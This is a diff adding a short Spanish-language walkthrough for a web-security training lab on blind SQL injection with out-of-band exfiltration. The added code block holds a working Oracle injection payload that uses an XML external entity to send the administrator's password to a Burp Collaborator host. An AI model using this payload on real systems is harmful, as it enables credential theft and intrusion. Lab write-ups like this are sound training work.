@@ -365,3 +365,11 @@ verificamos que tenemos respuesta de burp collaborator
 
 ![sql15.2.png](sql15.2.png)
 
+### Lab 16: Blind SQL injection with out-of-band data exfiltration
+
+Usamos lo mismo que el anterior laboratorio, pero en este caso tenemos una maquina con el sistema gestos de oracle así que use la siguiente injeccion.
+
+```sql
+'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+from+users+where+username%3d'administrator')||'.1sugypi7x0xpk09lluylmpcqmhs7gw.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual --
+```
+
